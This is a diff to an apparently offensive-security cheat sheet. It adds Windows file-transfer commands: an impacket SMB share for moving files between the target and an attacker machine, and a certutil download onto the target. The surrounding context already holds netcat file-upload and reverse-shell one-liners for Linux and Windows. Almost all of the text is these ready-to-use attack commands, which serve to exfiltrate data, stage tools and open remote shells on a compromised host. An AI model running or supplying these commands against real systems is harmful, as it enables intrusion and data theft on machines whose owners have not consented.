@@ -8,6 +8,8 @@
 
     - [Upload / Download Files with Netcat](#upload--download-files-with-netcat)
 
+    - [Upload / Download Files with SMB](#upload--download-files-with-smb)
+
     - [Netcat](#netcat)
 
     - [Reverse Shells](#reverse-shells)
@@ -161,6 +163,18 @@ Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>
 Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>
 
 Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
+
+### Upload / Download Files with SMB (Windows)
+
+Establish the SMB Share on Your Local Machine: <code>sudo impacket share .</code>
+
+Download (Local Machine -> Target Machine): <code>copy \\[LOCAL_IP]\share\[FILE] [C:\OUTPUT\LOCATION]
+
+Upload (Target Machine -> Local Machine): <code> copy [FILE] \\[LOCAL_IP]\share\[FILE]
+
+### Download Files with CertUtil (Windows)
+
+Download: <code>certutil -urlcache -f http/s://[LOCAL_IP]/[FILE] [C:\OUTPUT\LOCATION]
 
 ### Reverse Shells
 
